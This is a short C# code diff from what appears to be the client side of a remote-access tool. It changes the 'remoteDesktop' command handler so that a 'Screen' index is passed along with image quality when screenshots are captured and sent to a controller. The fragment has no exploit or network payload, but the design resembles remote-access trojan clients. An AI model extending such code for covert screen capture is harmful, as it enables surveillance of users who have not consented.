@@ -115,7 +115,7 @@ namespace Client.Handle_Packet
                     case "remoteDesktop":
                         {
                             HandleRemoteDesktop remoteDesktop = new HandleRemoteDesktop();
-                            remoteDesktop.CaptureAndSend(Convert.ToInt32(unpack_msgpack.ForcePathObject("Quality").AsInteger));
+                            remoteDesktop.CaptureAndSend(Convert.ToInt32(unpack_msgpack.ForcePathObject("Quality").AsInteger), Convert.ToInt32(unpack_msgpack.ForcePathObject("Screen").AsInteger));
                             break;
                         }
 
